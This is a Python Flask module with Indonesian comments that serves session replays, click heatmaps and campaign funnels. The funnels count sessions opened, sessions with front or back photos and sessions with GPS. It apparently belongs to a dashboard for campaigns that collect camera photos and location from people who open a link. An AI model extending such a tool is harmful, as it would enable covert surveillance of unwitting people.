"""Session Replay + Click Heatmap endpoints."""
from flask import Blueprint, jsonify
from app.auth import login_required
from app.config import Config
from app.models import Session as SessionModel, Event
import json
import os

bp = Blueprint("replay", __name__)


@bp.route("/session/<ts>/replay")
@login_required
def session_replay(ts):
    """Ambil semua screenshot frames untuk replay."""
    s = SessionModel.query.filter_by(ts=ts).first()
    if not s:
        return jsonify({"ok": False, "msg": "not found"}), 404

    frames = []

    # 1. Screenshot utama
    screenshot_path = os.path.join(Config.SCREENSHOT_DIR, ts + "_screenshot.png")
    if os.path.isfile(screenshot_path):
        frames.append({"type": "screenshot", "filename": ts + "_screenshot.png", "label": "Screenshot"})

    # 2. Foto depan
    depan_path = os.path.join(Config.UPLOAD_DIR, ts + "_depan.png")
    if os.path.isfile(depan_path):
        frames.append({"type": "photo", "filename": ts + "_depan.png", "label": "Foto Depan"})

    # 3. Foto belakang
    belakang_path = os.path.join(Config.UPLOAD_DIR, ts + "_belakang.png")
    if os.path.isfile(belakang_path):
        frames.append({"type": "photo", "filename": ts + "_belakang.png", "label": "Foto Belakang"})

    # 4. Burst photos (kalau ada)
    if os.path.isdir(Config.BURST_DIR):
        try:
            burst_files = sorted([f for f in os.listdir(Config.BURST_DIR) if f.startswith(ts + "_burst_")])
            for bf in burst_files:
                frames.append({"type": "burst", "filename": bf, "label": "Burst"})
        except Exception:
            pass

    # 5. Event timeline
    events = Event.query.filter_by(session_ts=ts).order_by(Event.id).limit(200).all()
    timeline = [{"type": e.event_type, "data": e.data,
                 "time": e.created_at.isoformat() if e.created_at else None}
                for e in events]

    return jsonify({
        "ok": True,
        "frames": frames,
        "timeline": timeline,
        "session": s.to_dict(),
    })


@bp.route("/heatmap/<ts>")
@login_required
def click_heatmap(ts):
    """Aggregate click events untuk heatmap."""
    rows = Event.query.filter_by(session_ts=ts, event_type="click").all()
    clicks = []
    for r in rows:
        try:
            d = json.loads(r.data)
            x = d.get("x")
            y = d.get("y")
            vw = d.get("vw") or 1
            vh = d.get("vh") or 1
            if x is not None and y is not None:
                clicks.append({
                    "x": round(x / vw * 100, 2),
                    "y": round(y / vh * 100, 2),
                    "raw_x": x,
                    "raw_y": y,
                    "vw": vw,
                    "vh": vh,
                })
        except Exception:
            pass

    screenshot_url = None
    screenshot_path = os.path.join(Config.SCREENSHOT_DIR, ts + "_screenshot.png")
    if os.path.isfile(screenshot_path):
        screenshot_url = "/api/file/" + ts + "_screenshot.png"

    return jsonify({
        "ok": True,
        "clicks": clicks,
        "total": len(clicks),
        "screenshot_url": screenshot_url,
    })


@bp.route("/funnel/<campaign>")
@login_required
def funnel_api(campaign):
    q = SessionModel.query
    if campaign != "all":
        q = q.filter_by(campaign=campaign)
    total = q.count()
    with_photo = q.filter(
        (SessionModel.has_depan == 1) | (SessionModel.has_belakang == 1)
    ).count()
    with_gps = q.filter(SessionModel.lat.isnot(None)).count()
    return jsonify({
        "ok": True,
        "campaign": campaign,
        "opened": total,
        "with_photo": with_photo,
        "with_gps": with_gps,
    })
